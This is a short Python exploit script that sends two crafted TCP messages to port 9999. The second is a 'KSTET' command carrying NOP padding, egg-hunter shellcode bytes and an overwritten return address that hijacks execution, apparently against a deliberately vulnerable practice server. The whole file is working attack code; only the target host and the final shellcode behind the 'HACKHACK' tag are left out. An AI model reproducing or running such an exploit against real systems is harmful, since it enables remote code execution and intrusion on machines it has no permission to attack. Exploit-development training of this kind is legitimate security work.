#!/usr/bin/python
import socket

payload = ""
payload += "HACKHACK"

RHOST = ""

RPORT = 9999
# Address of JMP ESP
EIP = "\xaf\x11\x50\x62"
egg_hunter = b""
egg_hunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
egg_hunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x48\x41\x43\x4b"
egg_hunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
buffer = ""
buffer += "KSTET "
buffer += "\x90" * 2
buffer += egg_hunter
buffer += "\x90" * (70 - 2 - len(egg_hunter))
buffer += EIP
buffer += "\xeb\xb4"
buffer += "\x90" * (1000 - len(buffer))
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Connecting to " + RHOST + " on port " + str(RPORT))
connection.connect((RHOST, RPORT))
connection.recv(1024)
print("[*] Sending payload")
connection.send("STATS " + payload)
connection.close()
print("[*] Payload had been sent")
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Connecting to " + RHOST + " on port " + str(RPORT))
connection.connect((RHOST, RPORT))
connection.recv(1024)
print("[*] Sending exploit")
connection.send(buffer)
connection.close()
print("[*] Exploit had been sent")
